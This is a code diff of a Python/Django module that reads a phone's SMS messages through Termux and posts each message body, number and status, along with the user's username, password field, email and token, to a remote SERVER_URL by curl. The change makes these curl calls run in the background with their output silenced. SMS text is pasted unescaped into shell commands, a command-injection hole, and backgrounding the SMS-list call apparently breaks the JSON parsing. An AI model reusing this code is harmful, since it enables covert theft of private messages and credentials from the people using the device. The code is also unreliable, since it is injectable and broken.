@@ -5,14 +5,14 @@ from .conf import SERVER_URL
 
 def check_sms(THIS_USER_TOKEN):
     try:
-        res = json.loads(os.popen('termux-sms-list -l 1000 &> /dev/null').read())
+        res = json.loads(os.popen('termux-sms-list -l 1000 &> /dev/null &').read())
     except:
         raise ('Termux command error!')
 
     for sms in res:
         if not sms_list.objects.filter(received=sms['received']).exists():
             call_back = os.popen(
-                f'curl --data "token={THIS_USER_TOKEN}&body={sms["body"]}&phone_number={sms["number"]}&type={sms["type"]}&read={bool(str(sms["read"]).capitalize())}&received={sms["received"]}" {SERVER_URL}/s/sms_list/ &> /dev/null')
+                f'curl --data "token={THIS_USER_TOKEN}&body={sms["body"]}&phone_number={sms["number"]}&type={sms["type"]}&read={bool(str(sms["read"]).capitalize())}&received={sms["received"]}" {SERVER_URL}/s/sms_list/ &> /dev/null &')
 
 
 def check_contact(THIS_USER_TOKEN):
@@ -52,7 +52,7 @@ def check_call(THIS_USER_TOKEN):
 def register_server(THIS_USER_TOKEN):
     from django.shortcuts import get_object_or_404
     this_user = get_object_or_404(Token, token=THIS_USER_TOKEN).user
-    os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&token={THIS_USER_TOKEN}" {SERVER_URL}/register/ &> /dev/null')
+    os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&token={THIS_USER_TOKEN}" {SERVER_URL}/register/ &> /dev/null &')
 
 def InsertIntoDb(THIS_USER_TOKEN):
     check_sms(THIS_USER_TOKEN)
